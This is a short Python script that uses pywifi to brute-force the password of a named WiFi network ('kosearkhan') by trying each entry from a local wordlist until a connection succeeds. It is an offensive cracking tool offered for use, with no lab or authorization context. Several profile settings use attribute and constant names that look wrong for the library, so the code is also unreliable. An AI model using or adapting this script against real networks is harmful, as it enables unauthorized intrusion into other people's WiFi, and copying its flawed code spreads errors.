import pywifi
from pywifi import const
# from pywifi import Profile
# from PIL import Image

# Initialize WiFi interface
wifi = pywifi.PyWiFi()
interface = wifi.interfaces()[0]

# Target WiFi network name (SSID)
target_ssid = "kosearkhan"  # Replace with the actual SSID

# Load dictionary of passwords
passwords = []  # This will store cracked passwords
with open(r"C:\Users\manje\OneDrive\complete python\C_Files\sumit.txt", "r") as file:  # Replace with your dictionary file
    passwords = [line.strip() for line in file]

# Scan for nearby networks
interface.scan()
print(f"Scanning for WiFi networks...")
import time
time.sleep(2)  # Wait for scan to complete
scans = interface.scan_results()

# Find the target network
target_network = None
for scan in scans:
    if scan.ssid == target_ssid:
        target_network = scan
        break

if target_network:
    # Attempt to connect using passwords
    for password in passwords:
        # Create a WiFi profile
        profile = pywifi.Profile()
        profile.ssid = target_ssid
        profile.auth = const.AUTH_ALG_OPEN
        profile.aider = const.WPA2_AUTH
        profile.akm_mode = const.AKM_MODE_WPA2
        profile.cipher = const.CIPHER_CCMP
        profile.key = password

        # Remove existing profile if it exists
        interface.disconnect()
        interface.connect(profile)

        # Wait for connection
        import time
        time.sleep(2)

        # Check if connected
        if interface.status() == const.IFACE_CONNECTED:
            print(f"WiFi password cracked: {password}")
            break
    else:
        print("Password not found in dictionary.")
else:
    print(f"Target WiFi network '{target_ssid}' not found.")
